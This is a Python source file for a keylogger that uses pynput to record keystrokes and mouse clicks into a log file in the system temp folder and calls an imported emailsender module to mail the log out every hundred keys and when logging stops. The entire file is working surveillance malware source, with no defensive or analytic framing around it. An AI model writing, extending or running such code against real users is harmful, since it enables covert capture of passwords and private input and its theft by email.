#this section is they keylogger, reading in the info and spitting it 
#into a txt file


import pynput
from pynput import mouse
import emailsender
import os
import tempfile
from pynput.keyboard import Key, Listener

count = 0
count2=0
keys=[]
mouseflag=1

log_path = os.path.join(tempfile.gettempdir(), "log.txt")

#def for writing to file, cleaning it up so it looks nice and clean
def write_file(keys):
    #open the file in append mode
    with open(log_path, "a") as f:
        #for every key entered
        for key in keys:
            #replace the keys string key with an empty slot
            k2= str(key).replace("'","")
            #
            k=k2.replace('""',"'")
            if k.find("backspace")>0:
                f.write(" (back) ")
            if k.find("space") > 0:
                f.write(" ")
            elif k.find("Key") == -1:
                f.write(k)

#okay so backspaces should be here

#command for click
def on_click(pressed):
    global mouseflag
    if mouseflag==1:
        if pressed:
            print("mouse clicked")
            keys.append(" (mouse_click) ")
    else:
        return False



#commamand for on press                
def on_press(key):
    global keys, count, count2
    keys.append(key)
    count+=1
    count2+=1
    print("{0} pressed".format (key))


    if count2 >= 100:
            count2=0
            write_file(keys)
            keys=[]
            #send the mail
            emailsender.sendmail()
            
    #if the count is greater than 10 save to file
    elif count >= 10:
        count=0
        write_file(keys)
        keys=[]

    


#check if program is getting ended
def on_release(key):
    global mouseflag
    #if the key is esc
    if key==Key.esc:
        #write what you have to the file
        write_file(keys)
        #send the mail
        emailsender.sendmail()
        mouseflag=0
        return False
    

#for the button that ends the logger
def end():
    #write the keys to the file
    write_file(keys)
    #send the email
    emailsender.sendmail()
    #set mouseflag to false
    mouseflag=0
    #end
    return False


    
def startlog():
    #wipe the text file and start listening
    with Listener(on_press=on_press, on_release =on_release) as listener:
        with mouse.Listener(on_click=on_click) as listener2:
            with open(log_path, "w") as wipe:
                wipe.close()
            #two listeners one for keyboard one for mouse
            listener.join()
            listener2.join()
